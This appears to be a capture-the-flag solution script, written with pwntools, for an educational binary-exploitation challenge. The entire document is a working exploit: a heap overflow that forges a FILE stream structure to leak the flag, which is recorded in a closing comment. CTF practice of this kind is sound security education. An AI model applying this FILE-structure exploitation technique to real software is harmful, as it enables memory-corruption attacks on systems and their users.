from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level = "debug"

# io = gdb.debug("./chal", "c")
io = remote("edu-ctf.zoolab.org", 30215)
io.recvuntil(b"for you: ")
note_addr = int(io.recvlineS().strip(), 16)
flag_addr = note_addr - 0x1010
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(
    b"data> ",
    b"a" * 0x200
    + flat([0, 0x1E0])
    + flat(
        [
            0xFBAD0000 | 0x0800,
            0,
            flag_addr,
            0,
            flag_addr,
            flag_addr + 0x40,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1,
        ]
    ),
)
io.sendlineafter(b"> ", b"3")
io.interactive()

# FLAG{600d_mu51c_53r135_p4r7_1_youtu.be/Z2Z9V-4DMGw}
